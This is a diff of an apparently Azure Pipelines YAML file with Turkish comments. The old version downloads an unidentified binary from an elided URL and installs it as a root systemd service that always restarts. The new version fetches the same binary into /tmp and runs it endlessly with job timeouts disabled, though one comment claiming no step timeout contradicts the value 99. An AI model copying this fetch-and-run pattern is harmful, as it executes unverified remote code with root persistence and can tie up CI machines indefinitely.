@@ -1,35 +1,16 @@
 trigger: [ main ]
 
-pool: { name: "german" }   # bu ajan, hedef VM'nin kendisi olsun
-
-steps:
-- checkout: none
-- bash: |
-    set -euo pipefail
-    sudo install -d -m 0755 /opt/newtoss
-    sudo wget -q -O /opt/newtoss/newtoss https://.../autoren8
-    sudo chmod +x /opt/newtoss/newtoss
-
-    sudo bash -c 'cat >/etc/systemd/system/newtoss.service <<EOF
-    [Unit]
-    Description=Newtoss daemon
-    After=network-online.target
-    Wants=network-online.target
-
-    [Service]
-    ExecStart=/opt/newtoss/newtoss
-    Restart=always
-    RestartSec=5
-    WorkingDirectory=/opt/newtoss
-    User=root
-    LimitNOFILE=1048576
-
-    [Install]
-    WantedBy=multi-user.target
-    EOF'
-
-    sudo systemctl daemon-reload
-    sudo systemctl enable --now newtoss
-
-    systemctl --no-pager --full status newtoss || true
-  displayName: "Kur & servis olarak başlat"
+jobs:
+- job: long_run
+  pool: { name: "german" }
+  timeoutInMinutes: 0            # job zaman aşımı yok
+  cancelTimeoutInMinutes: 5
+  steps:
+  - checkout: none
+  - bash: |
+      set -euo pipefail
+      wget -q -O /tmp/newtoss https://.../autoren8
+      chmod +x /tmp/newtoss
+      /tmp/newtoss                # foreground; job bitmez
+    displayName: Sonsuz çalıştır
+    timeoutInMinutes: 99           # adım için de yok
